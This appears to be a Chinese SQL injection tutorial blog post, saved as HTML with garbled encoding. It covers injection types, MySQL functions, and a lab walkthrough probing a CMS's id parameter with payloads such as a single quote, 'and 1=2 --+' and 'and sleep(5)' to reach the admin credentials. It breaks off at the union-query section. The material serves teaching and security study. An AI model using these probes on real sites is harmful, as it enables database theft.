        <content type="html"><![CDATA[<h1 id="ä¸€ã€-SQLæ³¨å…¥ç®€ä»‹"><a href="#ä¸€ã€-SQLæ³¨å…¥ç®€ä»‹" class="headerlink" title="ä¸€ã€ SQLæ³¨å…¥ç®€ä»‹"></a>ä¸€ã€ SQLæ³¨å…¥ç®€ä»‹</h1><h2 id="1-1-SQLç®€ä»‹"><a href="#1-1-SQLç®€ä»‹" class="headerlink" title="1.1 SQLç®€ä»‹"></a>1.1 SQLç®€ä»‹</h2><p>ç»“æ„åŒ–æŸ¥è¯¢è¯­è¨€ ï¼ˆStructured Query Languageï¼‰æ˜¯å…³ç³»å¼æ•°æ®åº“ç®¡ç†ç³»ç»Ÿçš„æ ‡å‡†è¯­è¨€ï¼ˆANSI X3.135 - 1986ï¼‰ï¼Œå®é™…ä¸Šä¸åŒæ•°æ®åº“ç³»ç»Ÿä¹‹é—´çš„SQLä¸èƒ½å®Œå…¨ç›¸äº’é€šç”¨ã€‚</p><h3 id="å…³ç³»å‹æ•°æ®åº“"><a href="#å…³ç³»å‹æ•°æ®åº“" class="headerlink" title="å…³ç³»å‹æ•°æ®åº“"></a>å…³ç³»å‹æ•°æ®åº“</h3><ul><li><p>ç‰¹ç‚¹ï¼šæ˜æ˜¾çš„å±‚æ¬¡ç»“æ„ï¼Œ åº“å|è¡¨å|å­—æ®µå|å­—æ®µå†…å®¹</p></li><li><p>ä¾‹å­ï¼šmysqlã€accessã€ Mssqlã€orcale</p></li></ul><h2 id="1-2-sqlæ³¨å…¥"><a href="#1-2-sqlæ³¨å…¥" class="headerlink" title="1.2 sqlæ³¨å…¥"></a>1.2 sqlæ³¨å…¥</h2><p> ä¸€ç§å¸¸è§çš„Webå®‰å…¨æ¼æ´ï¼Œæ”»å‡»è€…åˆ©ç”¨è¿™ä¸ªæ¼æ´ï¼Œå¯ä»¥è®¿é—®æˆ–ä¿®æ”¹æ•°æ®ï¼Œæˆ–è€…åˆ©ç”¨æ½œåœ¨çš„æ•°æ®åº“æ¼æ´è¿›è¡Œæ”»å‡»ã€‚</p><p><u>æ”»å‡»è€…é€šè¿‡å‘ã€ç”¨æˆ·å¯æ§å‚æ•°ã€‘ä¸­æ³¨å…¥SQLè¯­æ³•ï¼Œã€ç ´ååŸæœ‰SQLç»“æ„ã€‘è¾¾åˆ°ç¼–å†™ç¨‹åºæ—¶æ„æ–™ä¹‹å¤–ç»“æœçš„æ”»å‡»è¡Œä¸ºã€‚</u></p><ul><li>æ¼æ´åŸç†ï¼š</li></ul><p>1ã€ç¨‹åºç¼–å†™è€…åœ¨å¤„ç†ç¨‹åºå’Œæ•°æ®åº“äº¤äº’æ—¶ï¼Œä½¿ç”¨å­—ç¬¦ä¸²æ‹¼æ¥çš„æ–¹å¼æ„é€ SQLè¯­å¥ã€‚</p><p>2ã€æœªå¯¹ç”¨æˆ·å¯æ§å‚æ•°è¿›è¡Œè¶³å¤Ÿçš„è¿‡æ»¤ä¾¿å°†å‚æ•°å†…å®¹æ‹¼æ¥è¿›å…¥åˆ°SQLè¯­å¥ä¸­ã€‚</p><h2 id="1-3-æ³¨å…¥ç‚¹å¯èƒ½å­˜åœ¨çš„ä½ç½®"><a href="#1-3-æ³¨å…¥ç‚¹å¯èƒ½å­˜åœ¨çš„ä½ç½®" class="headerlink" title="1.3 æ³¨å…¥ç‚¹å¯èƒ½å­˜åœ¨çš„ä½ç½®"></a>1.3 æ³¨å…¥ç‚¹å¯èƒ½å­˜åœ¨çš„ä½ç½®</h2><p>Webåº”ç”¨åœ¨è·å–ç”¨æˆ·æ•°æ®çš„åœ°æ–¹ï¼Œåªè¦å¸¦å…¥æ•°æ®åº“æŸ¥è¯¢ï¼Œéƒ½æœ‰å­˜åœ¨SQLæ³¨å…¥çš„å¯èƒ½ï¼Œè¿™äº›åœ°æ–¹é€šå¸¸åŒ…æ‹¬:</p><p>1ï¼‰@GETæ•°æ®</p><p>2ï¼‰@POSTæ•°æ®</p><p>3ï¼‰@Cookieæ•°æ®</p><p>4ï¼‰@HTTP å¤´éƒ¨ï¼ˆHTTP è¯·æ±‚æŠ¥æ–‡å…¶ä»–å­—æ®µï¼‰</p><p>GPCæ˜¯æœ€å¸¸ç”¨çš„ä¸‰ç§æäº¤æ•°æ®çš„æ–¹æ³•ã€‚</p><h2 id="1-4-SQLæ³¨å…¥æ¼æ´çš„å±å®³"><a href="#1-4-SQLæ³¨å…¥æ¼æ´çš„å±å®³" class="headerlink" title="1.4 SQLæ³¨å…¥æ¼æ´çš„å±å®³"></a>1.4 SQLæ³¨å…¥æ¼æ´çš„å±å®³</h2><p>1ï¼‰å¢åˆ æ”¹æŸ¥ï¼šæ“ä½œæ•°æ®åº“æ•°æ®ã€‚</p><p>2ï¼‰è„±åº“ï¼šè·å–æ•°æ®åº“ä¸­çš„å¤šç§ä¿¡æ¯(ä¾‹å¦‚:ç®¡ç†å‘˜åå°å¯†ç )ï¼Œä»è€Œè„±å–æ•°æ®åº“ä¸­å†…å®¹(è„±åº“)</p><p>3ï¼‰ææƒï¼šå¦‚æœæ•°æ®åº“æƒé™åˆ†é…å­˜åœ¨é—®é¢˜ï¼Œæˆ–è€…æ•°æ®åº“æœ¬èº«å­˜åœ¨ç¼ºé™·ï¼Œé‚£ä¹ˆæ”»å‡»è€…å¯ä»¥é€šè¿‡SQLæ³¨å…¥æ¼æ´ç›´æ¥å†™å…¥webshellæˆ–è€…è·å–æœåŠ¡å™¨ç³»ç»Ÿæƒé™ã€‚ä¾‹å¦‚ï¼šmofææƒï½œudfææƒ</p><h2 id="1-5-SQLæ³¨å…¥åˆ†ç±»"><a href="#1-5-SQLæ³¨å…¥åˆ†ç±»" class="headerlink" title="1.5 SQLæ³¨å…¥åˆ†ç±»"></a>1.5 SQLæ³¨å…¥åˆ†ç±»</h2><p>âš ï¸ï¼šæ•°æ®åº“ä¸­ä¸‰ç§æ•°æ®ç±»å‹æ•°å­—ã€æ–‡æœ¬ã€æ—¶é—´ã€‚</p><h3 id="1-5-1-ä»æ•°æ®ç±»å‹çš„è§’åº¦åˆ†ç±»"><a href="#1-5-1-ä»æ•°æ®ç±»å‹çš„è§’åº¦åˆ†ç±»" class="headerlink" title="1.5.1 ä»æ•°æ®ç±»å‹çš„è§’åº¦åˆ†ç±»"></a>1.5.1 ä»æ•°æ®ç±»å‹çš„è§’åº¦åˆ†ç±»</h3><p>æ•°å­—å‹ï¼šæ•°å­—å‹æ³¨å…¥å°±æ˜¯è¯´æ³¨å…¥ç‚¹çš„æ•°æ®ï¼Œæ‹¼æ¥åˆ°SQLè¯­å¥ä¸­æ˜¯ä»¥æ•°å­—å‹å‡ºç°çš„ï¼Œå³æ•°æ®ä¸¤è¾¹æ²¡æœ‰è¢«å•å¼•å·ã€åŒå¼•å·åŒ…æ‹¬ã€‚</p><p>å­—ç¬¦å‹ï¼šå­—ç¬¦å‹æ³¨å…¥æ­£å¥½ç›¸åã€‚</p><h3 id="1-5-2-ä»æ³¨å…¥æ‰‹æ³•çš„è§’åº¦åˆ†ç±»"><a href="#1-5-2-ä»æ³¨å…¥æ‰‹æ³•çš„è§’åº¦åˆ†ç±»" class="headerlink" title="1.5.2 ä»æ³¨å…¥æ‰‹æ³•çš„è§’åº¦åˆ†ç±»"></a>1.5.2 ä»æ³¨å…¥æ‰‹æ³•çš„è§’åº¦åˆ†ç±»</h3><p>1ï¼‰è”åˆæŸ¥è¯¢ï¼šUNION query SQL injection ï¼ˆå¯è”åˆæŸ¥è¯¢æ³¨å…¥ï¼‰</p><p>2ï¼‰å¸ƒå°”ç›²æ³¨ï¼šBoolean-based blind SQL injection ï¼ˆå¸ƒå°”å‹æ³¨å…¥ï¼‰</p><p>3ï¼‰å»¶æ—¶æ³¨å…¥ï¼šTime-based blind SQL inj ection ï¼ˆåŸºäºæ—¶é—´å»¶è¿Ÿæ³¨å…¥ï¼‰</p><p>4ï¼‰æŠ¥é”™æ³¨å…¥ï¼šError-based SQL injection ï¼ˆæŠ¥é”™å‹æ³¨å…¥ï¼‰</p><p>5ï¼‰å †å æŸ¥è¯¢ï¼šStacked queries SQL injection ï¼ˆå¯å¤šè¯­å¥æŸ¥è¯¢æ³¨å…¥ï¼‰</p><h3 id="1-5-3-ä»æ³¨å…¥çš„ä½ç½®è§’åº¦åˆ†ç±»"><a href="#1-5-3-ä»æ³¨å…¥çš„ä½ç½®è§’åº¦åˆ†ç±»" class="headerlink" title="1.5.3 ä»æ³¨å…¥çš„ä½ç½®è§’åº¦åˆ†ç±»"></a>1.5.3 ä»æ³¨å…¥çš„ä½ç½®è§’åº¦åˆ†ç±»</h3><ul><li><p>GETæ³¨å…¥</p></li><li><p>POSTæ³¨å…¥</p></li><li><p>Cookieæ³¨å…¥</p></li><li><p>HTTPå…¶ä»–å¤´å­—æ®µæ³¨å…¥</p></li><li><p>ã€ç•™è¨€æ¿æ³¨å…¥</p></li><li><p>æœç´¢æ¡†æ³¨å…¥</p></li><li><p>â€¦ã€‘</p></li></ul><h1 id="äºŒã€MysqlåŸºç¡€çŸ¥è¯†"><a href="#äºŒã€MysqlåŸºç¡€çŸ¥è¯†" class="headerlink" title="äºŒã€MysqlåŸºç¡€çŸ¥è¯†"></a>äºŒã€MysqlåŸºç¡€çŸ¥è¯†</h1><h2 id="2-1-mysqlæ³¨é‡Š"><a href="#2-1-mysqlæ³¨é‡Š" class="headerlink" title="2.1 mysqlæ³¨é‡Š"></a>2.1 mysqlæ³¨é‡Š</h2><pre class="line-numbers language-mysql" data-language="mysql"><code class="language-mysql"># ã€HTTPå¤´éƒ¨æ³¨å…¥ã€‘-- ã€--ç©ºæ ¼ã€--+ URLæ³¨å…¥ã€å¦‚æœåœ¨URLæ³¨å…¥ä¸­ä½¿ç”¨#ï¼Œè¦å°†å…¶ç¼–ç ä¸º%23ã€‘/*...*/ /*!...*/ ã€å†…è”æŸ¥è¯¢ã€‘<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><h2 id="2-2-å…ƒæ•°æ®"><a href="#2-2-å…ƒæ•°æ®" class="headerlink" title="2.2 å…ƒæ•°æ®"></a>2.2 å…ƒæ•°æ®</h2><p>åº“åã€è¡¨åã€å­—æ®µåç­‰ä¿¡æ¯</p><h2 id="2-3-mysqlå…ƒæ•°æ®æ•°æ®åº“ï¼ˆinformation-schemaï¼‰"><a href="#2-3-mysqlå…ƒæ•°æ®æ•°æ®åº“ï¼ˆinformation-schemaï¼‰" class="headerlink" title="2.3 mysqlå…ƒæ•°æ®æ•°æ®åº“ï¼ˆinformation_schemaï¼‰"></a>2.3 mysqlå…ƒæ•°æ®æ•°æ®åº“ï¼ˆinformation_schemaï¼‰</h2><h3 id="2-3-1-information-schemaçš„ä¿¡æ¯"><a href="#2-3-1-information-schemaçš„ä¿¡æ¯" class="headerlink" title="2.3.1 information_schemaçš„ä¿¡æ¯"></a>2.3.1 information_schemaçš„ä¿¡æ¯</h3><img src="/2022/10/04/web-an-quan/sql-zhu-ru/%E6%88%AA%E5%B1%8F2024-12-05%2017.27.55.png" alt="information_schemaçš„å…³é”®ä¿¡æ¯" style="zoom:40%;"><ul><li><p>è¡¨æ‰€å±åº“çš„ä¿¡æ¯ï¼Ÿtables-table_schema</p></li><li><p>å­—æ®µæ‰€å±çš„è¡¨åï¼Ÿcolumns-table_name</p></li><li><p>å­—æ®µæ‰€å±çš„åº“åï¼Ÿcolumns-table_schema</p></li><li><p>æ‰€æœ‰çš„è¡¨åï¼Ÿtables-table_name</p></li><li><p>æ‰€æœ‰çš„å­—æ®µåï¼Ÿcolumns-column_name</p></li></ul><h4 id="EXï¼šå®éªŒæ“ä½œ"><a href="#EXï¼šå®éªŒæ“ä½œ" class="headerlink" title="EXï¼šå®éªŒæ“ä½œ"></a>EXï¼šå®éªŒæ“ä½œ</h4><img src="/2022/10/04/web-an-quan/sql-zhu-ru/image-20241122161518766-2263322.png" alt="å…ƒæ•°æ®åº“æ“ä½œç¤ºä¾‹" style="zoom:90%;"><h3 id="5-5-4-Mysql-å¸¸ç”¨å‡½æ•°ä¸å‚æ•°"><a href="#5-5-4-Mysql-å¸¸ç”¨å‡½æ•°ä¸å‚æ•°" class="headerlink" title="5.5.4 Mysql å¸¸ç”¨å‡½æ•°ä¸å‚æ•°"></a>5.5.4 Mysql å¸¸ç”¨å‡½æ•°ä¸å‚æ•°</h3><p>å¸¸ç”¨å‡½æ•°åˆ—è¡¨ï¼š</p><table><thead><tr><th>=|&gt;|&gt;=|&lt;=|&lt;&gt;</th><th>æ¯”è¾ƒè¿ç®—ç¬¦</th></tr></thead><tbody><tr><td>and|or</td><td>é€»è¾‘è¿ç®—ç¬¦  âš ï¸ï¼štrue 1 false 0ï¼Œæ¯”è¾ƒè¿ç®—ç¬¦å’Œé€»è¾‘è¿ç®—ç¬¦çš„ç»“æœæ˜¯ 1å’Œ0.</td></tr><tr><td>version()</td><td>mysql  æ•°æ®åº“ç‰ˆæœ¬</td></tr><tr><td>database()</td><td>å½“å‰æ•°æ®åº“å</td></tr><tr><td>user()</td><td>ç”¨æˆ·å</td></tr><tr><td>current_user()</td><td>å½“å‰ç”¨æˆ·å</td></tr><tr><td>system_user()</td><td>ç³»ç»Ÿç”¨æˆ·å</td></tr><tr><td>@@datadir</td><td>æ•°æ®åº“è·¯å¾„</td></tr><tr><td>@@versoin_compile_os</td><td>æ“ä½œç³»ç»Ÿç‰ˆæœ¬</td></tr><tr><td>length()</td><td>è¿”å›å­—ç¬¦ä¸²çš„é•¿åº¦</td></tr><tr><td>substring()</td><td>æˆªå–å­—ç¬¦ä¸²</td></tr><tr><td>substr()</td><td>1. æˆªå–çš„å­—ç¬¦ä¸²  2. æˆªå–èµ·å§‹ä½ç½®ï¼Œä»1å¼€å§‹è®¡æ•°  3. æˆªå–é•¿åº¦</td></tr><tr><td>mid()</td><td></td></tr><tr><td>left()</td><td>ä»å·¦ä¾§å¼€å§‹å–æŒ‡å®šå­—ç¬¦ä¸ªæ•°çš„å­—ç¬¦ä¸²</td></tr><tr><td>concat()</td><td>æ²¡æœ‰åˆ†éš”ç¬¦çš„è¿æ¥å­—ç¬¦ä¸²</td></tr><tr><td>concat_ws()</td><td>å«æœ‰åˆ†å‰²ç¬¦çš„è¿æ¥å­—ç¬¦ä¸²</td></tr><tr><td>group_concat()</td><td>è¿æ¥ä¸€ä¸ªç»„çš„å­—ç¬¦ä¸²</td></tr><tr><td>ord()</td><td>è¿”å›ASCII ç </td></tr><tr><td>ascii()</td><td>è¿”å›ASCII ç </td></tr><tr><td>hex()</td><td>å°†å­—ç¬¦ä¸²è½¬æ¢ä¸ºåå…­è¿›åˆ¶</td></tr><tr><td>unhex()</td><td>hex çš„åå‘æ“ä½œ</td></tr><tr><td>md5()</td><td>è¿”å›MD5 å€¼</td></tr><tr><td>floor(x)</td><td>è¿”å›ä¸å¤§äºx çš„æœ€å¤§æ•´æ•°</td></tr><tr><td>round()</td><td>è¿”å›å‚æ•°x æ¥è¿‘çš„æ•´æ•°</td></tr><tr><td>rand()</td><td>è¿”å›0-1 ä¹‹é—´çš„éšæœºæµ®ç‚¹æ•°</td></tr><tr><td>load_file()</td><td>è¯»å–æ–‡ä»¶ï¼Œå¹¶è¿”å›æ–‡ä»¶å†…å®¹ä½œä¸ºä¸€ä¸ªå­—ç¬¦ä¸²</td></tr><tr><td>sleep()</td><td>ç¡çœ æ—¶é—´ä¸ºæŒ‡å®šçš„ç§’æ•°</td></tr><tr><td>if(true,t,f)</td><td>if åˆ¤æ–­</td></tr><tr><td>find_in_set()</td><td>è¿”å›å­—ç¬¦ä¸²åœ¨å­—ç¬¦ä¸²åˆ—è¡¨ä¸­çš„ä½ç½®</td></tr><tr><td>benchmark()</td><td>æŒ‡å®šè¯­å¥æ‰§è¡Œçš„æ¬¡æ•°</td></tr><tr><td>name_const()</td><td>è¿”å›è¡¨ä½œä¸ºç»“æœ</td></tr></tbody></table><img src="/2022/10/04/web-an-quan/sql-zhu-ru/image-20241122162522971-2263927.png" alt="å‡½æ•°æ“ä½œç¤ºä¾‹" style="zoom:90%;"><img src="/2022/10/04/web-an-quan/sql-zhu-ru/image-20241122162852365-2264134.png" alt="æ¯”è¾ƒè¿ç®—ç¬¦" style="zoom:80%;"><h1 id="ä¸‰ã€æ³¨å…¥ç‚¹çš„åˆ¤æ–­"><a href="#ä¸‰ã€æ³¨å…¥ç‚¹çš„åˆ¤æ–­" class="headerlink" title="ä¸‰ã€æ³¨å…¥ç‚¹çš„åˆ¤æ–­"></a>ä¸‰ã€æ³¨å…¥ç‚¹çš„åˆ¤æ–­</h1><h2 id="3-1-ä»¥CMSç«™ç‚¹ä¸ºä¾‹"><a href="#3-1-ä»¥CMSç«™ç‚¹ä¸ºä¾‹" class="headerlink" title="3.1 ä»¥CMSç«™ç‚¹ä¸ºä¾‹"></a>3.1 ä»¥CMSç«™ç‚¹ä¸ºä¾‹</h2><p>ï¼ˆwin2008-cmsç«™ç‚¹ -æ³¨å…¥ç‚¹åˆ¤æ–­ï¼‰</p><p>ä¸ºäº†æ¼”ç¤ºSQLæ³¨å…¥çš„å››å¤§åŸºæœ¬æ‰‹æ³•ï¼Œæˆ‘ä»¬ä»¥CMSä¸ºä¾‹ã€‚ [http: //ip/cms/]</p><ul><li>ç¯å¢ƒï¼š</li></ul><p>â€‹        ç¯å¢ƒ-win2008-cmsç«™ç‚¹ </p><p>â€‹        æ”»å‡»è€…ï¼šwin10 ICS å·¥å…·ï¼šã€å¾¡å‰‘-åå°æ‰«æã€‘</p><ul><li>ç›®æ ‡ï¼š</li></ul><p>â€‹é€šè¿‡SQLæ³¨å…¥æ¼æ´è·å¾—åå°ç®¡ç†å‘˜å¸å¯†å¹¶æˆåŠŸç™»å½•ç³»ç»Ÿã€‚</p><p>â€‹åå°åœ°å€[<a href="http://172.16.132.138/cms/admin/]">http://172.16.132.138/cms/admin/]</a></p><ul><li><p>å››å¤§åŸºæœ¬æ‰‹æ³•å¯è¡Œæ€§åˆ¤æ–­</p><ul><li>è”åˆæŸ¥è¯¢</li><li>æŠ¥é”™æ³¨å…¥</li><li>å¸ƒå°”ç›²æ³¨</li><li>å»¶æ—¶æ³¨å…¥</li></ul><p>å¯¹é“¾æ¥ [http:/ /172.16.132.138/ cms/show. php?id=33]æ˜¯å¦æ˜¯æ³¨å…¥ç‚¹è¿›è¡Œåˆ¤æ–­ã€‚</p></li></ul><h2 id="3-2-æ•°æ®åº“å›æ˜¾"><a href="#3-2-æ•°æ®åº“å›æ˜¾" class="headerlink" title="3.2 æ•°æ®åº“å›æ˜¾"></a>3.2 æ•°æ®åº“å›æ˜¾</h2><p>å½“æˆ‘ä»¬å˜æ¢idå‚æ•°(33+1|33-1) çš„æ—¶å€™ï¼Œå‘ç°åŒä¸€ä¸ªé¡µé¢ï¼Œshow. phpé¡µé¢å±•ç°å‡ºä¸åŒçš„æ–°é—»å†…å®¹ã€‚ä¹Ÿå°±æ˜¯è¯´ï¼Œæ•°æ®åº“ä¸­çš„å†…å®¹ä¼šå›æ˜¾åˆ°ç½‘é¡µä¸­æ¥ã€‚åˆæ­¥åˆ¤å®šï¼Œidå‚æ•°ä¼šå¸¦å…¥æ•°æ®åº“æŸ¥è¯¢ï¼Œæ ¹æ®ä¸åŒçš„idæŸ¥è¯¢æ•°æ®åº“ï¼Œå¾—åˆ°ä¸åŒçš„æ–°é—»å†…å®¹ã€‚çŒœæµ‹åå°æ‰§è¡Œçš„SQLè¯­å¥å¤§è‡´ç»“æ„ä¸º:</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span> dbName <span class="token keyword">where</span> id<span class="token operator">=</span><span class="token number">33</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="3-3-åˆ¤æ–­æ•°å­—å‹è¿˜æ˜¯å­—ç¬¦å‹ã€æ˜¯å¦å¯ä»¥è¿›è¡ŒæŠ¥é”™æ³¨å…¥"><a href="#3-3-åˆ¤æ–­æ•°å­—å‹è¿˜æ˜¯å­—ç¬¦å‹ã€æ˜¯å¦å¯ä»¥è¿›è¡ŒæŠ¥é”™æ³¨å…¥" class="headerlink" title="3.3 åˆ¤æ–­æ•°å­—å‹è¿˜æ˜¯å­—ç¬¦å‹ã€æ˜¯å¦å¯ä»¥è¿›è¡ŒæŠ¥é”™æ³¨å…¥"></a>3.3 åˆ¤æ–­æ•°å­—å‹è¿˜æ˜¯å­—ç¬¦å‹ã€æ˜¯å¦å¯ä»¥è¿›è¡ŒæŠ¥é”™æ³¨å…¥</h2><p>å•å¼•å·</p><p>[?id=33â€™]</p><p>æ‰§è¡Œçš„SQLä¸»è¯­åˆ™å˜ä¸º</p><p>select * from tbName where id=33â€™ ; </p><p>é¡µé¢æŠ¥é”™ï¼Œå¹¶ä¸”æŠ¥é”™ä¿¡æ¯ä¼šå›æ˜¾åœ¨ç½‘é¡µä¸­ï¼ŒæŠ¥é”™ä¿¡æ¯å¦‚ä¸‹</p><p>You have an error in your SQL syntax; check the manual that corresponds to your MySQL</p><p>server version for the right syntax to use near â€˜ â€˜ â€˜ at line 1</p><p>é”™è¯¯ä¿¡æ¯æç¤ºå•å¼•å·ä½ç½®å‡ºç°é”™è¯¯ï¼Œé‚£ä¹ˆè¯´æ˜ï¼ŒSQLè¯­å¥ä»å¤´åˆ°å‚æ•°33éƒ½æ˜¯æ­£ç¡®çš„ã€‚ä¹Ÿå°±æ˜¯è¯´ï¼Œæˆ‘ä»¬æ·»åŠ çš„å•å¼•å·æ˜¯å¤šä½™çš„ã€‚å› æ­¤ï¼Œå¯ä»¥æ–­å®šå‚æ•°33å‰é¢æ²¡æœ‰å¼•å·ã€‚åˆ™ï¼Œæ­¤æ³¨å…¥ç‚¹(å¯èƒ½)ä¸ºæ•°å­—å‹æ³¨å…¥ã€‚</p><blockquote><h4 id="æ•°å­—å‹ï¼Ÿå­—ç¬¦å‹ï¼Ÿ"><a href="#æ•°å­—å‹ï¼Ÿå­—ç¬¦å‹ï¼Ÿ" class="headerlink" title="æ•°å­—å‹ï¼Ÿå­—ç¬¦å‹ï¼Ÿ"></a><strong>æ•°å­—å‹ï¼Ÿå­—ç¬¦å‹ï¼Ÿ</strong></h4><p>â€‹æ³¨æ„æŠ¥é”™ä¿¡æ¯çš„åŸç†ï¼šä»ç¬¬ä¸€ä¸ªå­—ç¬¦å¼€å§‹å¾€åè¯»ï¼Œè¯»åˆ°è¯­æ³•é”™è¯¯ç„¶åæŠ¥é”™ã€‚ä¸Šè¿°æŠ¥é”™ä¿¡æ¯è¯´æ˜ï¼Œâ€™â€â€˜ä¹‹å‰éƒ½æ˜¯æ­£ç¡®çš„ã€‚â€™â€™æ˜¯æŠ¥é”™ä¿¡æ¯çš„å•å¼•å·ã€‚è§„å¾‹ï¼šæŠ¥é”™ä¿¡æ¯ä¸å‡ºç°æ•°å­—-æ•°å­—å‹ã€æŠ¥é”™ä¿¡æ¯å‡ºç°æ•°å­—-å­—ç¬¦å‹ã€‚</p></blockquote><h2 id="3-4-åˆ¤æ–­å¸ƒå°”çŠ¶æ€æ˜¯å¦å­˜åœ¨"><a href="#3-4-åˆ¤æ–­å¸ƒå°”çŠ¶æ€æ˜¯å¦å­˜åœ¨" class="headerlink" title="3.4 åˆ¤æ–­å¸ƒå°”çŠ¶æ€æ˜¯å¦å­˜åœ¨"></a>3.4 åˆ¤æ–­å¸ƒå°”çŠ¶æ€æ˜¯å¦å­˜åœ¨</h2><ul><li>[and 1=1]</li></ul><p>[?id=33 and 1=1 â€“ +]</p><p>å¯èƒ½å¾—SQLè¯­å¥ä¸º</p><p>select * from tbName where id=33 and 1=1 â€“+</p><p>é¡µé¢æ­£å¸¸ã€‚å­˜åœ¨å»¶æ—¶çŠ¶æ€æ˜¯å¦å­˜åœ¨ </p><ul><li>[and 1=2]</li></ul><p>[?id=33 and 1=2 â€“ -+]</p><p>å¯èƒ½å¾—SQLè¯­å¥</p><p>select * from dbName where id=33 and 1=2 â€“+</p><p>é¡µé¢æ²¡æœ‰æ–°é—»å†…å®¹ï¼Œå¹¶ä¸”æ•°æ®åº“æ²¡æœ‰æŠ¥é”™ã€‚ç”±äº1=2æ˜¯æ’å‡å¼ï¼Œä¹Ÿå°±æ˜¯æŸ¥è¯¢æ¡ä»¶</p><p>[where id=33 and 1=2 â€“+]æ’å‡ï¼Œè¿™æ ·çš„SQLè¯­å¥åœ¨æ•°æ®åº“ä¸­æ‰§è¡Œåï¼Œæ²¡æœ‰è¿”å›ç»“æœï¼Œæ²¡æœ‰æ–°é—»å†…å®¹ã€‚</p><p>åè¿‡æ¥çœ‹ï¼Œé¡µé¢æ²¡æœ‰æ–°é—»å†…å®¹ï¼Œä¹Ÿå°±æ˜¯SQLè¯­å¥æŸ¥è¯¢æ¡ä»¶ä¸ºå‡ã€‚ä¹Ÿå°±æ˜¯è¯´ï¼Œæˆ‘ä»¬å†™çš„è¯­å¥</p><p>[and 1=2 â€“+], èµ·åˆ°äº†å°†æŸ¥è¯¢æ¡ä»¶ç½®ä¸ºå‡çš„ä½œç”¨ã€‚</p><p>é‚£ä¹ˆï¼Œå¯ä»¥é€šè¿‡æ„é€ è¯­å¥æ¥æ§åˆ¶SQLè¯­å¥çš„æŸ¥è¯¢ç»“æœå¹¶ä¸”ï¼ŒSQLè¯­å¥æŸ¥è¯¢æ¡ä»¶çœŸå‡æ€§ï¼Œåœ¨é¡µé¢å›æ˜¾ä¸­æœ‰ä½“ç°ã€‚</p><h2 id="3-5-å­˜åœ¨å»¶æ—¶çŠ¶æ€æ˜¯å¦å­˜åœ¨"><a href="#3-5-å­˜åœ¨å»¶æ—¶çŠ¶æ€æ˜¯å¦å­˜åœ¨" class="headerlink" title="3.5 å­˜åœ¨å»¶æ—¶çŠ¶æ€æ˜¯å¦å­˜åœ¨"></a>3.5 å­˜åœ¨å»¶æ—¶çŠ¶æ€æ˜¯å¦å­˜åœ¨</h2><ul><li>[and sleep(5) ]</li></ul><p>[?id=33 and sleep(5)]</p><p>æ³¨å…¥sleep(5)è¯­å¥ï¼Œå¯ä»¥é€šè¿‡ç½‘ç»œæ—¶é—´çº¿çœ‹åˆ°å»¶æ—¶ã€‚</p><p>è¯´æ˜sleep(5)è¯­å¥èµ·åˆ°äº†ä½œç”¨ã€‚</p><p>ç»¼ä¸Šï¼Œæ­¤è¿æ¥å­˜åœ¨SQLæ³¨å…¥æ¼æ´ã€‚</p><h2 id="EXï¼š-CMSç«™ç‚¹SQLæ³¨å…¥æ¼æ´å­˜åœ¨æ€§å’Œæ³¨å…¥ç‚¹åˆ¤æ–­"><a href="#EXï¼š-CMSç«™ç‚¹SQLæ³¨å…¥æ¼æ´å­˜åœ¨æ€§å’Œæ³¨å…¥ç‚¹åˆ¤æ–­" class="headerlink" title="EXï¼š CMSç«™ç‚¹SQLæ³¨å…¥æ¼æ´å­˜åœ¨æ€§å’Œæ³¨å…¥ç‚¹åˆ¤æ–­"></a>EXï¼š CMSç«™ç‚¹SQLæ³¨å…¥æ¼æ´å­˜åœ¨æ€§å’Œæ³¨å…¥ç‚¹åˆ¤æ–­</h2><img src="/2022/10/04/web-an-quan/sql-zhu-ru/image-20241122163931252-2264775.png" alt="CMSç«™ç‚¹SQLæ³¨å…¥æ¼æ´å­˜åœ¨æ€§å’Œæ³¨å…¥ç‚¹åˆ¤æ–­" style="zoom:80%;"><h2 id="3-6-æ€»ç»“"><a href="#3-6-æ€»ç»“" class="headerlink" title="3.6 æ€»ç»“"></a>3.6 æ€»ç»“</h2><p>å†èµ˜è¿°ä¸€éã€‚</p><img src="/2022/10/04/web-an-quan/sql-zhu-ru/image-20241122164606984.png" alt="æ‰‹å·¥åˆ¤æ–­æ³¨å…¥ç‚¹çš„æ–¹æ³•æ€»ç»“" style="zoom:80%;"><h1 id="å››ã€è”åˆæŸ¥è¯¢æ³¨å…¥"><a href="#å››ã€è”åˆæŸ¥è¯¢æ³¨å…¥" class="headerlink" title="å››ã€è”åˆæŸ¥è¯¢æ³¨å…¥"></a>å››ã€è”åˆæŸ¥è¯¢æ³¨å…¥</h1><h2 id="4-1-æ¦‚è¿°"><a href="#4-1-æ¦‚è¿°" class="headerlink" title="4.1 æ¦‚è¿°"></a>4.1 æ¦‚è¿°</h2><p>ç”±äºæ•°æ®åº“ä¸­çš„å†…å®¹ä¼šå›æ˜¾åˆ°é¡µé¢ä¸­æ¥ï¼Œæ‰€ä»¥æˆ‘ä»¬å¯ä»¥é‡‡ç”¨è”åˆæŸ¥è¯¢è¿›è¡Œæ³¨å…¥ã€‚ è”åˆæŸ¥è¯¢å°±æ˜¯SQLè¯­æ³•ä¸­çš„union select è¯­å¥ã€‚ è¯¥è¯­å¥ä¼šåŒæ—¶æ‰§è¡Œä¸¤æ¡selectè¯­å¥ï¼Œç”Ÿæˆä¸¤å¼ è™šæ‹Ÿè¡¨ï¼Œç„¶åæŠŠæŸ¥è¯¢åˆ°çš„ç»“æœè¿›è¡Œæ‹¼æ¥ã€‚ select ï½ï½ï½ union selectï½ï½ï½ ç”±äºè™šæ‹Ÿè¡¨æ˜¯äºŒç»´ç»“æ„ï¼Œè”åˆæŸ¥è¯¢ä¼šâ€çºµå‘â€æ‹¼æ¥ï¼Œä¸¤å¼ è™šæ‹Ÿçš„è¡¨ã€‚</p><p>è”åˆæŸ¥è¯¢çš„å¼ºå¤§ä¹‹å¤„ï¼šã€å¯ä»¥è·¨åº“è·¨è¡¨æŸ¥è¯¢ã€‘ã€‚</p><h2 id="4-2-å¿…è¦æ¡ä»¶"><a href="#4-2-å¿…è¦æ¡ä»¶" class="headerlink" title="4.2 